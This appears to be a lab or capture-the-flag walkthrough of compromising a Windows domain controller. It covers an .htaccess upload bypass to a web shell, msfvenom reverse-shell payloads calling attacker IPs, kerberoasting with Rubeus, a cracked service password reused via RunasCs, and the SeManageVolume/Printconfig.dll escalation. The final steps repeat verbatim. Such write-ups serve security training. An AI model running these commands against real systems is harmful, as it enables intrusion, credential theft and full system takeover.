
Seems to be a domain controller with the ports open
![](attachment/8ac886a73b87789e3876ee80bb7bb42a.png)

# 80
![](attachment/6ba5afb985a53c72543a84b840b5130e.png)
Website present

There is an upload on the website:![](attachment/7c7647c244b7d3226d2a4905db32cc33.png)
We also have an upload directory:
![](attachment/124187b1df9c0ef407f89029e1e057da.png)

Now we can modify the `.htaccess`

To create new `.htaccess` file:
```bash 
echo "AddType application/x-httpd-php .evil" > .htaccess
```
Now uploading it.
We can access it at http://192.168.218.187/uploads/shell.evil:
![](attachment/03e4c2305e762b0ec9ee1b875172fa72.png)
Then generating a msfvenom payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.45.186 LPORT=4444 > reverse.exe
```

Now we can execute it after transfering to get a shell:
![](attachment/72fd80088455a9ecce4b6611f1d0a7dc.png)


![](attachment/b8e368b3d5dd198b5a1e85e94327ac13.png)
Might be possible but the process is most likely running as svc_apache.

![](attachment/cd7c3e087ca20aca098653b58f3957a6.png)![](attachment/108fbcb2f02234eac9b91ae898897899.png)
Nope

![](attachment/993fccdb000804eac39426a26f669880.png)

Now using kerberoasting we got the hash:
```
.\Rubeus.exe kerberoast /nowrap /tgtdeleg
```
![](attachment/2dc4e890c915bdda2e37b23cbb506e0c.png)

Now cracking it:
![](attachment/353c1648877cef7b50ff1996098d5632.png)

Now to get a shell as svc_mssql:
```
import-module .\Invoke-RunasCs.ps1
```
```
Invoke-RunasCs svc_mssql trustno1 cmd.exe -remote 192.168.45.167:1234
```
We have SeManageVolumePrivilege:
![](attachment/07cadef6ba0d830aec9b8d7f11d67b39.png)

Now we can use an exploit:
https://github.com/CsEnox/SeManageVolumeExploit/releases
Run it first
```
SeManageVolumeExploit.exe
```

For Printconfig.dll:
```bash 
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
```
Then transfer to machine
Then copy it:
```
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
```

Then in powershell:
```powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```
Now should have got a shell
![](attachment/02e21ca77f13cbe857d748b02f57fef8.png)

Run it first
```
SeManageVolumeExploit.exe
```

For Printconfig.dll:
```bash 
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
```
Then transfer to machine
Then copy it:
```
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
```